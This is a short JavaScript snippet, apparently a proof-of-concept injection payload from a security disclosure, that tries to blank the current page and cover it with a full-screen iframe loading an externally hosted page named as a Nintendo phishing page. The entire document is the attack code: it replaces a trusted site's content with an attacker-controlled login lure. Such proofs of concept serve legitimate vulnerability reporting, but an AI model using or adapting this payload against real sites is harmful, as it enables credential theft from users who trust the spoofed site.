document.body.innerHtml="";

var a=document.createElement("iframe");
a.src="https://khara-h1.github.io/poc/nintendo_phishing.html";
a.name="mainsite";
a.style = "width: 100%; height: 1024px; border: 0;position: absolute; top: 0; right: 0; bottom: 0: left: 0;"; 
document.body.appendChild(a);

